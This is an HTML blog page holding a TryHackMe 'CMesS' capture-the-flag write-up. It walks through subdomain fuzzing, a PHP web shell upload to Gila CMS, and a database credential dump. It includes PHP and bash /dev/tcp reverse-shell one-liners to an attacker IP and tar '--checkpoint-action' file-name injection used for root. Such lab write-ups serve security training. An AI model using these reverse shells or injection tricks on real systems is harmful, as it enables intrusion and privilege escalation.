@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>
+        TryHackMe - CMesS Writeup - fmash16&#39;s blog
+      </title>
+        <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    
+    <meta name="theme-color" content="#000000" />
+    <meta http-equiv="window-target" content="_top" />
+    
+    
+    <meta name="description" content="A linux machine running Gila CMS having subdomains. Privesc using wildcard tar cronjob" />
+    <meta name="generator" content="Hugo 0.71.0 with theme pure" />
+    <title>TryHackMe - CMesS Writeup - fmash16&#39;s blog</title>
+    
+    
+    <link rel="stylesheet" href="https://fmash16.github.io/css/style.min.8b61fcd81dd0056c9aae5070608e695164899bc516d3b5fef9fd5d9b8db2fdce.css">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
+    <meta property="og:title" content="TryHackMe - CMesS Writeup" />
+<meta property="og:description" content="A linux machine running Gila CMS having subdomains. Privesc using wildcard tar cronjob" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-cmess-writeup/" />
+<meta property="og:image" content="https://fmash16.github.io/img/tryhackme_cmess/card.png" />
+<meta property="og:image" content="https://fmash16.github.io/" />
+<meta property="article:published_time" content="2020-06-03T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-06-03T00:00:00+00:00" />
+
+<meta itemprop="name" content="TryHackMe - CMesS Writeup">
+<meta itemprop="description" content="A linux machine running Gila CMS having subdomains. Privesc using wildcard tar cronjob">
+<meta itemprop="datePublished" content="2020-06-03T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2020-06-03T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="688">
+<meta itemprop="image" content="https://fmash16.github.io/img/tryhackme_cmess/card.png">
+<meta itemprop="image" content="https://fmash16.github.io/">
+
+
+
+<meta itemprop="keywords" content="Gila CMS,subdomain,wfuzz,php,wildcard,tar,crontab,linux,mysqldump,fuzzing," /><meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://fmash16.github.io/img/tryhackme_cmess/card.png"/>
+
+<meta name="twitter:title" content="TryHackMe - CMesS Writeup"/>
+<meta name="twitter:description" content="A linux machine running Gila CMS having subdomains. Privesc using wildcard tar cronjob"/>
+
+    <!--[if lte IE 9]>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+      <![endif]-->
+
+    <!--[if lt IE 9]>
+        <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+      <![endif]-->
+
+   
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto&#43;Sans&#43;JP&amp;display=swap" type="text/css" media="all" /> 
+   
+
+  </head>
+
+  
+  
+
+  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="slimContent">
+      <div class="navbar-header">
+        <div class="profile-block text-center">
+          <a id="avatar" href="/">
+            <img class="img-circle img-rotate" src="https://fmash16.github.io/avatar.png" width="200" height="200">
+          </a>
+          <h2 id="name" class="hidden-xs hidden-sm">fmash16</h2>
+          <h3 id="title" class="hidden-xs hidden-sm hidden-md">Student</h3>
+          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Dhaka, Bangladesh</small>
+        </div><div class="search" id="search-form-wrap">
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
+                        class="icon icon-search"></i></button>
+            </span>
+        </div>
+        <div class="ins-search">
+            <div class="ins-search-mask"></div>
+            <div class="ins-search-container">
+                <div class="ins-input-wrapper">
+                    <input type="text" class="ins-search-input" placeholder="Type something..."
+                        x-webkit-speech />
+                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
+                        aria-label="Close"><span aria-hidden="true">×</span></button>
+                </div>
+                <div class="ins-section-wrapper">
+                    <div class="ins-section-container"></div>
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+
+        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+      </div>
+      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+        <ul class="nav navbar-nav main-nav">
+            <li class="menu-item menu-item-home">
+                <a href="/">
+                    <i class="icon icon-home-fill"></i>
+                  <span class="menu-title">Home</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-archives">
+                <a href="/posts/">
+                    <i class="icon icon-archives-fill"></i>
+                  <span class="menu-title">Posts</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-books">
+                <a href="/categories/">
+                    <i class="icon icon-book-fill"></i>
+                  <span class="menu-title">Writeups</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-tags">
+                <a href="/tags/">
+                    <i class="icon icon-tags"></i>
+                  <span class="menu-title">Tags</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-about">
+                <a href="/about/">
+                    <i class="icon icon-cup-fill"></i>
+                  <span class="menu-title">About</span>
+                </a>
+            </li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <div class="widget">
+  <h3 class="widget-title"><u> Categories</u></h3>
+    <div class="widget-body">
+        <ul class="category-list">
+            <li class="category-list-item"><a href="https://fmash16.github.io/categories/hackthebox-writeups/" class="category-list-link">hackthebox-writeups</a><span class="category-list-count">6</span></li>
+            <li class="category-list-item"><a href="https://fmash16.github.io/categories/tryhackme-writeups/" class="category-list-link">tryhackme-writeups</a><span class="category-list-count">4</span></li>
+        </ul>
+    </div>
+</div>
+<div class="widget">
+  <h3 class="widget-title"><u> Tags </u></h3>
+    <div class="widget-body">
+        <ul class="tag-list">
+            
+            
+            <a href="https://fmash16.github.io/tags/ad/" class="tag-list-link">ad</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/adminer/" class="tag-list-link">adminer</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/azure/" class="tag-list-link">azure</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/azure-ad-connect/" class="tag-list-link">azure-ad-connect</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/bludit-cms/" class="tag-list-link">bludit-cms</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/brainfuck/" class="tag-list-link">brainfuck</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/cewl/" class="tag-list-link">cewl</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/command-injection/" class="tag-list-link">command-injection</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/crackmapexec/" class="tag-list-link">crackmapexec</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/cron/" class="tag-list-link">cron</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/crontab/" class="tag-list-link">crontab</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/cve-2019-14287/" class="tag-list-link">cve-2019-14287</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/dll/" class="tag-list-link">dll</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/dns/" class="tag-list-link">dns</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/dnsadmins/" class="tag-list-link">dnsadmins</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/docker/" class="tag-list-link">docker</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/easy/" class="tag-list-link">easy</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/evil-winrm/" class="tag-list-link">evil-winrm</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/file-descriptor/" class="tag-list-link">file-descriptor</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/ftp/" class="tag-list-link">ftp</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/fuzzing/" class="tag-list-link">fuzzing</a><span class="tag-list-count">4</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/gila-cms/" class="tag-list-link">gila-cms</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/gtfobins/" class="tag-list-link">gtfobins</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/hacking/" class="tag-list-link">hacking</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/hydra/" class="tag-list-link">hydra</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/injection/" class="tag-list-link">injection</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/john/" class="tag-list-link">john</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/kvm/" class="tag-list-link">kvm</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/ldap/" class="tag-list-link">ldap</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/ldapsearch/" class="tag-list-link">ldapsearch</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/lfi/" class="tag-list-link">lfi</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/linux/" class="tag-list-link">linux</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/mysql/" class="tag-list-link">mysql</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/mysqldump/" class="tag-list-link">mysqldump</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/passthrough/" class="tag-list-link">passthrough</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/php/" class="tag-list-link">php</a><span class="tag-list-count">4</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/powershell/" class="tag-list-link">powershell</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/practice/" class="tag-list-link">practice</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/privesc/" class="tag-list-link">privesc</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/pt_chown/" class="tag-list-link">pt_chown</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/pwn/" class="tag-list-link">pwn</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/python/" class="tag-list-link">python</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/python-path-hijack/" class="tag-list-link">python-path-hijack</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/qemu/" class="tag-list-link">qemu</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/rce/" class="tag-list-link">rce</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/rpcclient/" class="tag-list-link">rpcclient</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/stego/" class="tag-list-link">stego</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/subdomain/" class="tag-list-link">subdomain</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/sudo/" class="tag-list-link">sudo</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/sudo-privesc/" class="tag-list-link">sudo-privesc</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/tar/" class="tag-list-link">tar</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/virtualization/" class="tag-list-link">virtualization</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/web/" class="tag-list-link">web</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/wfuzz/" class="tag-list-link">wfuzz</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/wildcard/" class="tag-list-link">wildcard</a><span class="tag-list-count">1</span>
+            
+        </ul>
+
+    </div>
+</div>
+
+<div class="widget">
+  <h3 class="widget-title"><u> Recent Posts </u></h3>
+    <div class="widget-body">
+        <ul class="recent-post-list list-unstyled no-thumbnail">
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-cmess-writeup/" class="title">TryHackMe - CMesS Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-06-03 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-06-03</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-blunder-writeup/" class="title">Hackthebox - Blunder Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-31 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-31</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-montevarde-writeup/" class="title">Hackthebox - Montevarde Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-30 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-30</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-resolute-writeup/" class="title">Hackthebox - Resolute Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-28 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-28</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-year-of-the-rabbit-writeup/" class="title">TryHackMe - Year of the Rabbit - Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-21 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-21</time>
+                    </p>
+                </div>
+            </li>
+        </ul>
+    </div>
+</div>
+
+  </div>
+</aside>
+
+    
+    
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <h4 class="toc-title">Table of Contents</h4>
+    <nav id="toc" class="js-toc toc">
+
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main"><div class="content">
+  <article id="-" class="article article-type-" itemscope
+    itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      <h3 itemprop="name">
+  <a
+    class="article-title"
+    href="/writeups/tryhackme-writeups/tryhackme-cmess-writeup/"
+    >TryHackMe - CMesS Writeup</a
+  >
+</h3>
+
+      <div class="article-meta">
+        
+<span class="article-date">
+  <i class="icon icon-calendar-check"></i>&nbsp;
+<a href="https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-cmess-writeup/" class="article-date">
+  <time datetime="2020-06-03 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-06-03</time>
+</a>
+</span>
+<span class="article-category">
+  <i class="icon icon-folder"></i>&nbsp;
+  <a class="article-category-link" href="/categories/tryhackme-writeups/"> TryHackMe writeups </a>
+</span>  
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>&nbsp;
+    <a class="article-tag-link" href="/tags/gila-cms/"> Gila CMS </a>
+    <a class="article-tag-link" href="/tags/subdomain/"> subdomain </a>
+    <a class="article-tag-link" href="/tags/wfuzz/"> wfuzz </a>
+    <a class="article-tag-link" href="/tags/php/"> php </a>
+    <a class="article-tag-link" href="/tags/wildcard/"> wildcard </a>
+    <a class="article-tag-link" href="/tags/tar/"> tar </a>
+    <a class="article-tag-link" href="/tags/crontab/"> crontab </a>
+    <a class="article-tag-link" href="/tags/linux/"> linux </a>
+    <a class="article-tag-link" href="/tags/mysqldump/"> mysqldump </a>
+    <a class="article-tag-link" href="/tags/fuzzing/"> fuzzing </a>
+  </span>
+<br>
+        
+        
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
+      <p><img src="/img/tryhackme_cmess/card.png" alt=""></p>
+<h1 id="nmap-scan">Nmap Scan</h1>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>nmap -sC -sV -sS -oN nmap.out cmess.thm 
+</code></pre></div><p>Open ports:</p>
+<ul>
+<li>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+ssh-hostkey:
+2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
+256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
+256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)</li>
+<li>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+http-generator: Gila CMS
+http-robots.txt: 3 disallowed entries
+/src/ /themes/ /lib/
+http-title: Site doesn&rsquo;t have a title (text/html; charset=UTF-8).</li>
+</ul>
+<h1 id="enumeration">Enumeration</h1>
+<p>Going to port 80, we find the Gila CMS home page</p>
+<p><img src="/img/tryhackme_cmess/100.png" alt=""></p>
+<h2 id="gobuster-fuzzing">Gobuster fuzzing</h2>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>gobuster dir -u http://cmess.thm/ -w /usr/share/wordlists/dirb/common.txt
+</code></pre></div><p>We got a lot of directories here. We get an <code>admin</code> login page for the
+<strong>Gila CMS</strong>.</p>
+<p><img src="/img/tryhackme_cmess/1.png" alt=""></p>
+<h2 id="fuzzing-for-subdomains">Fuzzing for subdomains</h2>
+<p>Domains might containg subdomains hosting different contents. We can fuzz for
+the subdomains for example: <code>XYZ.cmess.thm</code> using <code>wfuzz</code> by bruting
+the <code>host</code> header. If a subdomain exists, we will get a page with different
+word counts than the domain most likely as its contents are different. So, we
+execute the following first to get the word count of the page we already got
+for domain &ldquo;cmess.thm&rdquo;</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cmess.thm -H <span style="color:#ed9d13">&#34;Host: FUZZ.cmess.thm&#34;</span>
+</code></pre></div><p><img src="/img/tryhackme_cmess/2.png" alt=""></p>
+<p>We get lot of success outputs and with the wordcount <code>290</code>. So this is the
+word count of the home page we got. Any existing subdomain should contain different
+number of words. So we can specify it using <code>--hw 290</code> which &ldquo;Hide
+responses with the specified words&rdquo;.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cmess.thm -H <span style="color:#ed9d13">&#34;Host: FUZZ.cmess.thm&#34;</span> --hw <span style="color:#3677a9">290</span>
+</code></pre></div><p><img src="/img/tryhackme_cmess/3.png" alt=""></p>
+<p>And we get a subdomain <code>dev.cmess.htb</code>. We add it to our /etc/hosts file to
+the same IP address as of cmess.htb.</p>
+<h2 id="subdomain-contents">Subdomain Contents:</h2>
+<p>Browsing <a href="http://dev.cmess.thm">http://dev.cmess.thm</a>, we find the following</p>
+<p><img src="/img/tryhackme_cmess/4.png" alt=""></p>
+<p>It seems to be a chat between user andre and the support. And we get the email
+and password for the user andre which can be used for login in the cms</p>
+<p>Creds found:</p>
+<blockquote>
+<p>Email: <a href="mailto:andre@cmess.thm">andre@cmess.thm</a><br>
+Password: KPFTN_f2yxe%</p>
+</blockquote>
+<h2 id="gila-admin-login">Gila Admin Login</h2>
+<p>We login to the the cms using our found creds</p>
+<p><img src="/img/tryhackme_cmess/5.png" alt=""></p>
+<p>Looking around, we see that we have the ability to upload files to the machine
+at <code>Content -&gt; File Manager</code> option. We can upload a php-web-shell and get command
+execution on the box. We transfer our <a href="https://github.com/artyuum/Simple-PHP-Web-Shell/raw/master/index.php">php-web-shell.php</a> to the machine.</p>
+<p><img src="/img/tryhackme_cmess/200.png" alt=""></p>
+<p>Now we can go to the url <code>http://cmess.thm/assets/php-reverse-shell.php</code> and execute commands.</p>
+<p><img src="/img/tryhackme_cmess/6.png" alt=""></p>
+<h2 id="www-data-shell">www-data shell</h2>
+<p>We try getting a reverse shell using php</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>php -r <span style="color:#ed9d13">&#39;$sock=fsockopen(&#34;10.9.17.253&#34;,1234);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+</code></pre></div><p>On host</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>nc -lnvp <span style="color:#3677a9">1234</span>
+</code></pre></div><p>And we get a shell back as user www-data. We stabilize the shell.</p>
+<p><img src="/img/tryhackme_cmess/7.png" alt=""></p>
+<h1 id="privilege-escalation---user">Privilege Escalation - User</h1>
+<h2 id="gila-configphp">gila config.php</h2>
+<p>We find the file <code>config.php</code> under /var/www/html. The file has something
+interesting.</p>
+<p><img src="/img/tryhackme_cmess/8.png" alt=""></p>
+<p>We find the db creds for root.</p>
+<p>DB creds found:</p>
+<blockquote>
+<p>user : root<br>
+pass : r0otus3rpassw0rd</p>
+</blockquote>
+<h2 id="mysql-database-dump">MySQL database dump</h2>
+<p>We can dump the entire mysql database using the root creds we found using</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>mysqldump -uroot -pr0otus3rpassw0rd --all-databases &gt; all_databases.sql
+</code></pre></div><p>Having a throrogh look at the dump file, we find a hash for the user &ldquo;andre&rdquo;</p>
+<p><img src="/img/tryhackme_cmess/9.png" alt=""></p>
+<blockquote>
+<p>User: andre<br>
+Password: $2y$10$uNAA0MEze02jd.qU9tnYLu43bNo9nujltElcWEAcifNeZdk4bEsBa</p>
+</blockquote>
+<p>Looking at hashcat example hashes, we find that this hash is blowfish hash. We
+try cracking the hash using hashcat.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"></code></pre></div><h2 id="user-andre-backup">User andre backup</h2>
+<p>Looking around, we find an interesting file .password.bak under /opt. The file contains</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>andres backup password
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span>UQfsdCB7aAP6
+</code></pre></div><h2 id="ssh-login">SSH login</h2>
+<p>Using the found backup password, we login using ssh to get the user.txt.</p>
+<p><img src="/img/tryhackme_cmess/10.png" alt=""></p>
+<h1 id="privilege-escalation---root">Privilege Escalation - root</h1>
+<h2 id="enumeration-1">Enumeration</h2>
+<p>Copying linpeas.sh over to the target, we run it. Linpeas shows us some
+interesting cron jobs</p>
+<p><img src="/img/tryhackme_cmess/11.png" alt=""></p>
+<p>linpeas marks it as 99% PE vector. We see that the cron job backups everyting
+under the folder <code>/home/andre/backup</code> to the /tmp folder as a tar. For tar
+ing the files, it uses wildcard. Googling for a bit, we find that this wildcard
+can be exploited.</p>
+<h2 id="crontab-tar-exploit">Crontab tar exploit</h2>
+<p>This exploit has been very well explained in <a href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation">hackingarticles.in</a></p>
+<p>The tar privesc is also found in <a href="https://gtfobins.github.io/gtfobins/tar/#shell">gtfobins</a> though it needs to be changed for our use.</p>
+<p>Following the exploit, we write a script shell.sh that gives us a reverse shell</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span><span style="color:#cd2828;font-weight:bold">#!/bin/bash
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span><span style="color:#cd2828;font-weight:bold"></span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">3</span>bash -i &gt;&amp; /dev/tcp/10.9.17.253/1337 0&gt;&amp;<span style="color:#3677a9">1</span>
+</code></pre></div><p>Then we execute the following</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span><span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;&#34;</span> &gt; <span style="color:#ed9d13">&#34;--checkpoint-action=exec=bash shell.sh&#34;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span><span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;&#34;</span> &gt; --checkpoint=<span style="color:#3677a9">1</span>
+</code></pre></div><p>On the host, we open a nc listener and wait</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>nc -lnvp <span style="color:#3677a9">1337</span>
+</code></pre></div><p>And after a bit, we get our root shell and can read the root.txt under /root</p>
+<p><img src="/img/tryhackme_cmess/12.png" alt=""></p>
+
+    </div>
+    <div class="article-footer">
+<blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    <li class="post-copyright-link hidden-xs">
+      <strong>Permalink: </strong>
+      <a href="https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-cmess-writeup/" title="TryHackMe - CMesS Writeup" target="_blank" rel="external">https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-cmess-writeup/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>License：</strong><a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
+    </li>
+  </ul>
+</blockquote>
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/fmash16" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="https://fmash16.github.io/avatar.png" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/fmash16" target="_blank"><span class="text-dark">fmash16</span></a></h3>
+        <div>Hack the Planet</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+    </div>
+  </article>
+<section id="comments">
+</section>
+
+</div><nav class="bar bar-footer clearfix" data-stick-bottom>
+    <div class="bar-inner">
+        <ul class="pager pull-left">
+            <li class="prev">
+                <a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-blunder-writeup/" title="Hackthebox - Blunder Writeup"><i
+                        class="icon icon-angle-left"
